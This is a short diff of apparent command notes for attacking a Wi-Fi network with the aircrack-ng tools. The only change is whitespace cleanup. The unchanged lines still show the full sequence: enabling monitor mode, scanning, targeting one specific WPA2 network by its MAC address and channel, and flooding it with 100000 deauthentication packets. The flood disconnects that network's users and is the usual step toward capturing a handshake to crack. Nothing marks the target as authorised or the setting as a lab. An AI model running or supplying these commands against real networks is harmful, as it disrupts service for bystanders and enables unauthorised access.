@@ -2,8 +2,8 @@ airmon-ng
 airmon-ng start wlan0
 airodump-ng wlan0mon
 
-10:13:31:B6:E7:1D  -51       17        2    0   6  130  WPA2 CCMP   PSK  LIVE TIM_Z8EK        
- 
+10:13:31:B6:E7:1D  -51       17        2    0   6  130  WPA2 CCMP   PSK  LIVE TIM_Z8EK
+
 airodump-ng -c 6 --bssid 10:13:31:B6:E7:1D wlan0mon
 aireplay-ng -0 100000 -a 10:13:31:B6:E7:1D wlan0mon
 
